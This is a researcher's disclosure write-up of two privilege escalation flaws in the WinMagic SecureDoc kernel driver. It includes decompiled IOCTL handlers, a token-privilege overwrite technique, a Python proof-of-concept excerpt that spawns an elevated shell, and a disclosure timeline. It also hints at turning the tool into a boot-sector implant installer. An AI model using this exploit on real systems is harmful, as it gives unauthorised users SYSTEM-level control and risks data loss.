# Technical Write-up on CVE-2020-11519 and CVE-2020-11520

Date: June 2020

Author: Dennis Elser (code: [github](https://github.com/patois))
## Table of Contents

- [Introduction](#introduction)
- [Approach and Technical Description](#approach-and-technical-description)
  - [CVE-2020-11519](#cve-2020-11519)
  - [CVE-2020-11520](#cve-2020-11520)
- [Proof-of-Concept Exploit](#proof-of-concept-exploit)
- [Disclosure Timeline](#disclosure-timeline)
- [Solution](#solution)
- [Checksums](#checksums)
- [References](#references)

## Introduction
In reference to its [web representation](https://www.winmagic.com/products/full-disk-encryption-for-windows), Winmagic SecureDoc "allows businesses to deal with the security of their IT environment efficiently leveraging features including: Full Disk Encryption (FDE), Multi-Factor Authentication, Removable Media Container Encryption (RMCE) and File and Folder Encryption (FFE). These features help businesses increase security, mitigate business risk and meet government and regulatory requirements for hard drive encryption."

The Winmagic SecureDoc product, which is available in standalone and enterprise editions, is affected by two local privilege escalation vulnerabilities ([CVE-2020-11519](#cve-2020-11519) and [CVE-2020-11520](#cve-2020-11520)) in versions 8.3 and 8.5. After the vulnerabilities had been reported to Winmagic in late March, the vendor released a patch (version 8.5SR2) in [mid June 2020](#disclosure-timeline). However, this patch was found to address the vulnerabilities insufficiently, which also made version 8.5SR2 vulnerable to the reported flaws. Although technical details about the vulnerabilities had been held back for this reason, the flaws have to be [considered public](https://www.zynamics.com/bindiff.html) since then. ~~According to the vendor, another patch is still in the pipeline, roughly 106 days after the initial vulnerability report to Winmagic.~~ On July 15th, 111 days after the initial vulnerability report to the vendor, Winmagic released SecureDoc v8.5 SR2 HF1 to customers, which reportedly fixes CVE-2020-11519 and CVE-2020-11520. Versions of SecureDoc older than 8.3 have not been tested but can be assumed to be affected as well, based on the affected component's code

Successful exploitation of any of the vulnerabilities will lead to escalation of privileges to SYSTEM for locally authenticated attackers.

## Approach and Technical Description
Both vulnerabilities affect the component "SDDisk2k.sys", a kernel driver that comes with the Winmagic SecureDoc product. The security flaws were identified using manual static analysis with the help of the [Hex-Rays](https://www.hex-rays.com/) IDA Pro disassembler and decompiler. In retrospective, the weaknesses could have been discovered with significantly less effort if dynamic testing approaches such as fuzzing had been applied instead. This is because the driver can be interfaced with from limited user-mode applications and because it assumes their input to be well-formed by default.

### CVE-2020-11519
Due to the "SDDisk2k.sys" driver's unsafe creation of a "SecureDocDevice" device object and missing code that'd set up an appropriate security descriptor, even limited user accounts are given the ability to acquire a handle to the device using the [CreateFile()](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) API function. With the driver granting a user mode application a handle to its device object, it hereby opens up a direct path to its attack surface in kernel land.

``` c
RtlInitUnicodeString(&DestinationString, L"\\Device\\SecureDocDevice");
  RtlInitUnicodeString(&SymbolicLinkName, L"\\DosDevices\\SecureDocDevice");
  if ( IoCreateDevice(v1, 0xDD8u, &DestinationString, 0x8D1Fu, 0, 0, &DeviceObject) >= 0 )  // <--- unsafe
  {
    memset(DeviceObject->DeviceExtension, 0, 0xDD8ui64);
    DeviceObject->Flags |= 4u;
    DeviceObject->AlignmentRequirement = 0;
    if ( IoCreateSymbolicLink(&SymbolicLinkName, &DestinationString) < 0 )
      IoDeleteDevice(DeviceObject);
    IoObject = DeviceObject;
  }
```
By having reverse engineered a number of the "SDDisk2k.sys" driver's [IOCTL](https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/introduction-to-i-o-control-codes) service handlers, it was found that one of it exposes critical functionality to user mode, in that it allows read and write operations of an arbitrary drive's raw disk sectors - by design. Adding to this, by interfacing with this very code it was noticed that the driver ignores any exclusive locks that might have been set earlier on a drive. As a consequence, concurrent read/write operations are made possible, which facilitates race conditions and risks loss of data.

The following shows the driver's decompiled IOCTL service handler that is responsible for handling read requests of raw disk sectors. It calls a function sub_29CD4() with an argument "controlled_buf", which is a pointer to a buffer whose content can be chosen arbitrarily by any calling user mode application:

``` c
if ( ioctlcode == 0x8D1F2824 )   // <--- I/O control code for raw disk reading functionality
{
  controlled_buf = (unsigned __int8 *)controlled_addr;
  mode = 0;
  temp_result = sub_29CD4((char *)controlled_buf, v3, mode);   // <--- call to raw disk read function
```
Actually, this attacker-controlled buffer is a structure whose fields "offset", "length" and "ptr_buf" are entirely unchecked function arguments passed to a call to [IoBuildSynchronousFsdRequest()](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iobuildsynchronousfsdrequest). The latter function prepares an [IRP_MJ_READ](https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/irp-mj-read) I/O request packet [(IRP)](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp) that it sends to the underlying file system driver using a call to [IofCallDriver()](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iofcalldriver):

``` c
__int64 __fastcall sub_29CD4(char *controlled_addr, PIRP a2, char mode)
{
  //[...snip...]
  // extract drive number and type (floppy/hd) from offset 0
  devicetype_and_num = (unsigned __int8)*controlled_buf  // <--- controllable from user mode

  // advance pointer
  p = controlled_buf + 1;
  
  // build device name
  if ( (devicetype_and_num & 0x80u) == 0 )
    v11 = vsnprintf_wrapper(&device_name, 0x3Fui64, L"\\Device\\Floppy%d", devicetype_and_num);
  else
    v11 = vsnprintf_wrapper(&device_name, 0x3Fui64, L"\\Device\\Harddisk%d\\Partition0", devicetype_and_num & 0x7F);
  v12 = v11;
  if ( v11 >= 0 )
  {
    RtlInitUnicodeString(&DestinationString, &device_name);

    // get object pointer of drive
    if ( IoGetDeviceObjectPointer(&DestinationString, 0x80u, &FileObject, &DeviceObject) >= 0
      || (v12 = sub_2C5D4(&DestinationString, &DeviceObject), v12 >= 0) )
    {
      // extract further fields from structure
      offset = *(_QWORD *)(p + 0x4E);                    // <--- where to start reading from
      length = *(_DWORD *)(p + 0x56);                    // <--- number of bytes to read
      ptr_buf = *(void **)(p + 0x5A);                    // <--- ptr to destination buffer
      devobj = DeviceObject;
      StartingOffset.QuadPart = offset << 9;
      KeInitializeEvent(&Event, NotificationEvent, 0);
      
      // build request
      v17 = IoBuildSynchronousFsdRequest(
              (unsigned int)(mode != 0) + IRP_MJ_READ,   // <--- issue read request
              devobj,
              ptr_buf,
              length << 9,
              &StartingOffset,
              &Event,
              &IoStatusBlock);
      v18 = v17;
      if ( v17 )
      {
        v19 = v17->Tail.Overlay.CurrentStackLocation;
        if ( mode )
          v19[0xFFFFFFFF].Flags |= 0x10u;
        ObfReferenceObject(devobj);

        // send request to respective device object (issue read request)
        v12 = IofCallDriver(devobj, v18);
  //[...snip...]
}
```
Just like reading raw disk sectors, writing disk sectors from user mode is made possible by calling IOCTL handler 0x8D1F2820, which processes the same data structure and is implemented in a similar fashion. Given compatibility with this driver's protocol, there is nothing that will prevent arbitray user mode applications from completely compromising the Operating System. Unless protected by a secure boot mechanism, this even includes installation of software that is allowed to run as early as during the system's boot process (ransomware, bootkits, custom implants...).

### CVE-2020-11520
Further examination of the "SDDisk2k.sys" driver's service handlers revealed that memory addresses from user mode applications are processed without prior validation. In some cases, memory accessed by these pointers is blindly written to by the driver, which can be abused by attackers to create kernel write primitives. Whereas all of the write primitives allow direct control of **where** to write data to, unfortunately none was found that'd allow direct control of **what** data to write. With the exception of [CVE-2020-11519](#cve-2020-11519), whose exploitation in this context would require an additional detour through disk read/write operations, which is something I consider a dirty approach and thus wanted to avoid. However, one particular handler was identified that admittedly didn't allow the data itself to be controlled but still turned out to be good enough for being repurposed by other means.

The below decompiled code shows the driver's service handler for IOCTL code 0x8d1f282c. It takes a 16bit integer number "count" from a user-controlled buffer, then ensures it won't exceed a certain limit. Finally, a pointer "dst" is acquired from the very same controlled input buffer, but isn't ever going to be checked for validity before it is passed as an argument to a subsequent call to memmove(). To my initial disappointment, the "src" buffer that is passed as an argument to memmove() isn't controlled but instead points to a hardcoded string ("FRNSecureDoc v4.1\0"), which limits its usefulness for exploitation to a certain degree. Obviously, this service handler writes a version identifier into a user-specifiable address, which may just as well be abused for fingerprinting vulnerable versions of Winmagic SecurDoc.

``` c
// handler for I/O control code 0x8d1f282c

// get "count" from controlled buffer
count = *((_WORD *)controlled_buf + 5);

// if count is zero, return error
if ( !count )
{
  *((_WORD *)controlled_buf + 5) = 0x13;
  goto leave_dispatcher;
}

// otherwise further sanitize and limit "count"
if ( count >= 0x12u )
  count = 0x11;

// bug! controlled pointer, passed from userland!
dst = *(void **)(controlled_buf + 2);
src = aFrnsecuredocV4;   // <--- 'FRNSecureDoc v4.1',0

// unchecked write!
memmove(dst, src, count);
goto leave_dispatcher;
```
However, having this fully controlled "dst" address point to a suitable location in kernel space repurposes this IOCTL handler and turns it into a kernel write primitive. With reference to [[1]](#References) and [[2]](#References), calling this service handler with "dst" pointing to the kernel address of a process' token, or more precisely, to its "Privileges" member at offset 0x40, might lead to escalated privileges :)
```
0: kd> dt nt!_token ffffe40955f766b0
   +0x000 TokenSource      : _TOKEN_SOURCE
   +0x010 TokenId          : _LUID
   +0x018 AuthenticationId : _LUID
   +0x020 ParentTokenId    : _LUID
   +0x028 ExpirationTime   : _LARGE_INTEGER 0x7fffffff`ffffffff
   +0x030 TokenLock        : 0xffffd20f`f9adee10 _ERESOURCE
   +0x038 ModifiedId       : _LUID
   +0x040 Privileges       : _SEP_TOKEN_PRIVILEGES
   [...snip...]

0: kd> dt nt!_SEP_TOKEN_PRIVILEGES ffffe40955f766b0+0x40
   +0x000 Present          : 0x00000006`02880000
   +0x008 Enabled          : 0x800000
   +0x010 EnabledByDefault : 0x40800000
```
The SEP_TOKEN_PRIVILEGES structure is a set of bitmasks with individual bits representing a privilege flag, each. As a logic consequence, kindly asking the SecureDoc driver to store parts of its version string "FRNSecureDoc v4.1\0" into a process token's SEP_TOKEN_PRIVILEGES structure should flip a few bits and hopefully enable useful privileges, at least hypothetically. As it turns out, by having the driver store the first two characters of its version string into offsets 1 and 2 of the SEP_TOKEN_PRIVILEGE structure's "Present" field, a number of interesting token privileges are set. The '**F**' character taken from "**F**RNSecureDoc v4.1\0" equals 01000110 and therefore sets bit 9 (SeTakeOwnershipPrivilege), bit 10 (SeLoadDriverPrivilege) and bit 14 (SeIncreaseBasePriorityPrivilege) of the "Present" field. The '**R**' character equals 01010010, setting bit 17 (SeBackupPrivilege), bit 20 (SeDebugPrivilege) and bit 22 (SeSystemEnvironmentPrivilege):

| Bit No ("Present") | Character | Byte         | Privilege |
| :--------------: | :-------: | ------------ | --------- |
| 8                | 'F'       | 0100011**0** | SeSecurityPrivilege |
| 9                | 'F'       | 010001**1**0 | **SeTakeOwnershipPrivilege** |
| 10               | 'F'       | 01000**1**10 | **SeLoadDriverPrivilege** |
| 11               | 'F'       | 0100**0**110 | SeSystemProfilePrivilege |
| 12               | 'F'       | 010**0**0110 | SeSystemtimePrivilege |
| 13               | 'F'       | 01**0**00110 | SeProfileSingleProcessPrivilege |
| 14               | 'F'       | 0**1**000110 | **SeIncreaseBasePriorityPrivilege** |
| 15               | 'F'       | **0**1000110 | SeCreatePagefilePrivilege |
| 16               | 'R'       | 0101001**0** | SeCreatePermanentPrivilege |
| 17               | 'R'       | 010100**1**0 | **SeBackupPrivilege** |
| 18               | 'R'       | 01010**0**10 | SeRestorePrivilege |
| 19               | 'R'       | 0101**0**010 | SeShutdownPrivilege |
| 20               | 'R'       | 010**1**0010 | **SeDebugPrivilege** |
| 21               | 'R'       | 01**0**10010 | SeAuditPrivilege |
| 22               | 'R'       | 0**1**010010 | **SeSystemEnvironmentPrivilege** |
| 23               | 'R'       | **0**1010010 | SeChangeNotifyPrivilege |

## Proof-of-Concept Exploit
A [proof-of-concept exploit](https://github.com/patois/winmagic_sd/blob/master/sd_poc.py) has been developed in Python and debugged with the help of [Microsoft's WinDbg kernel debugger](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-download-toolsk) attached to an x64 Windows 10 VM.

This PoC exploit acquires the kernel address of the current process' security token and, among others, enables the SeDebugPrivilege privilege by exploiting described vulnerabilities. It then goes on to spawning a command shell that inherits the token's newly escalated privileges.

Having the SeDebugPrivilege flag set will make it possible for shellcode to be injected into and run in the context of a SYSTEM process - I'll leave this part to you however ;)

``` python
token_addr = sdi.get_token_obj()
if not token_addr:
    print("[!] Could not get address of token")
    sdi.close()
    return

print("[+] Got token object: %x" % token_addr)
print("[+] Patching token")
sdi.acquire_debug_privs(token_addr)
sdi.close()

os.system("cmd.exe")
```

In order to avoid putting anyone's data at risk, the public version of this PoC exploit has not been included any *active* code for reading from/writing to raw disk sectors using CVE-2020-11519. Still, it can easily be turned into an installer for whatever code you would like your boot sector to run, if calls to the disk_read_raw() and disk_write_raw() functions are added. What about installing and playing a round of [tetros](https://github.com/daniel-e/tetros) as an alternative to installing implants? ;)

The following shows the current process' token privileges before and after running the Proof-of-Concept exploit, respectively.

```
C:\Users\re>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled

C:\Users\re>python3 sd_poc.py

EoP PoC for WinMagic SecureDoc 8.5

[+] Got a handle to driver
[+] Got token object: ffffd68dd45d9990
[+] Patching token
Microsoft Windows [Version 10.0.17134.1304]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\re>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                              State
=============================== ======================================== ========
SeTakeOwnershipPrivilege        Take ownership of files or other objects Enabled
SeLoadDriverPrivilege           Load and unload device drivers           Enabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority             Enabled
SeBackupPrivilege               Back up files and directories            Enabled
SeDebugPrivilege                Debug programs                           Enabled
SeSystemEnvironmentPrivilege    Modify firmware environment values       Enabled
SeUndockPrivilege               Remove computer from docking station     Disabled
SeIncreaseWorkingSetPrivilege   Increase a process working set           Disabled
SeTimeZonePrivilege             Change the time zone                     Disabled

```
The PoC exploit code can be found [here](./sd_poc.py). It targets v8.5 of Winmagic SecureDoc x64 but might work on older versions (untested).

In case you've made it till here but are super bored still, feel free to dial IOCTL code 0x8D1F2848 ;)

``` c
case 0x8D1F2848:
  DbgPrint("SDDEV_IO_BLUE_SCREEN comes in ...");
  if ( *(_WORD *)controlled_buf == 0x55AA
    && *(_QWORD *)(controlled_buf + 2)
    && *((_WORD *)controlled_buf + 5) == 4 )
  {
    StartContext = ExAllocatePoolWithTag(PoolType, 4ui64, 'gaMW');
    if ( !StartContext )
    {
      KeSetPriorityThread(KeGetCurrentThread(), 0x1F);
      KeBugCheckEx(0xE2u, 0x2D8ui64, **(unsigned int **)(controlled_buf + 2), 0i64, 'WM');
    }
    DbgPrint("SDDEV_IO_BLUE_SCREEN preps ...");
    *StartContext = **(_DWORD **)(controlled_buf + 2);
    if ( PsCreateSystemThread(
            &ThreadHandle,
            0x1FFFFFu,
            0i64,
            0i64,
            0i64,
            (PKSTART_ROUTINE)sub_23948,
            StartContext) < 0 )
      ExFreePoolWithTag(StartContext, 0);
    else
      ZwClose(ThreadHandle);
  }
```

## Disclosure Timeline
``` 
Date       | Comment
--------------------------------------------------------------------------------------------
2020-03-27 | Shared vulnerability report with Winmagic representative
2020-03-28 | Winmagic confirmed receipt of vulnerability report
2020-04-04 | Shared CVE IDs CVE-2020-11519 and CVE-2020-11520 with Winmagic
2020-04-22 | Winmagic gave an estimated ETA of fix within 60-90 days
2020-06-14 | Winmagic shared pre-release of SecureDoc v8.5SR2 for testing
2020-06-17 | Informed Winmagic the fix doesn't properly address the vulnerabilities
2020-06-18 | Winmagic informed that SecureDoc v8.5SR2 had already been publicly released
           | in the meantime. According to this version's release notes, CVE-2020-11519
           | and CVE-2020-11520 are addressed ("SD-34145: Windows Client Security
           | Vulnerability Report"). Winmagic representative asked whether holding back
           | information about the vulnerabilities was an option till the next scheduled
           | release date in autumn, in favour of a proper fix
2020-06-19 | Informed Winmagic about the common 90-days disclosure deadline and that
           | postponing a proper fix for incorrect but already released bugfixes
           | would put users at risk even more so
2020-06-19 | Winmagic informed that a hotfix for the flawed v8.5SR2 patch of
           | SecureDoc is being worked on, no ETA given
2020-06-22 | Asked for ETA of the hotfix
2020-06-23 | Winmagic provided information about an intended release of a hotfix within
           | a two week time frame, starting with the passing of the 90-days deadline
2020-06-30 | Asked Winmagic about the current status
2020-06-30 | Winmagic assured that a fix would be made available before 2020-07-08
2020-07-08 | Winmagic informed about delay of release to 2020-07-09 or 2020-07-10, latest
2020-07-10 | Public release of this information, no public fix available (106 days)
2020-07-15 | Winmagic released SecureDoc v8.5 SR2 HF1 (111 days)
```

## Solution
Update to Winmagic SecureDoc v8.5 SR2 HF1.

## Checksums
| Filename             | Version | Hash (SHA-256) |
| -------------------- | ------- | -------------- |
| SDDisk2k.sys (64bit) | 8.3.717 | 98D29D28BB9552D20BC78EB0BD12A57B921167565F3E47919EC2D61F24DA9241 |
| SDDisk2k.sys (64bit) | 8.5.445 | 1D9054C4B49267EEF63B2EB11EC563E036F9E6E2AC18D32597FA769934BB7E18 |

## References
1. [Abusing Token Privileges For LPE](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
2. [Exploiting CVE-2014-4113 on Windows 8.1](http://jodeit.org/research/Exploiting_CVE-2014-4113_on_Windows_8.1.pdf)
3. [Easy local Windows Kernel exploitation](https://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernel_WP.pdf)
4. [I Got 99 Problem But a Kernel Pointer Ain’t One](https://recon.cx/2013/slides/Recon2013-Alex%20Ionescu-I%20got%2099%20problems%20but%20a%20kernel%20pointer%20ain%27t%20one.pdf)
5. [Exploiting Leaked Process and Thread Handles](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)
6. [Sourceforge Discussion about calling NtQuerySystemInformation using ctypes](https://sourceforge.net/p/ctypes/mailman/message/34578496/)
7. [SecureDoc v8.5SR2 release notes](https://www.winmagic.com/support/release-notes/securedoc-v8-5-sr2)
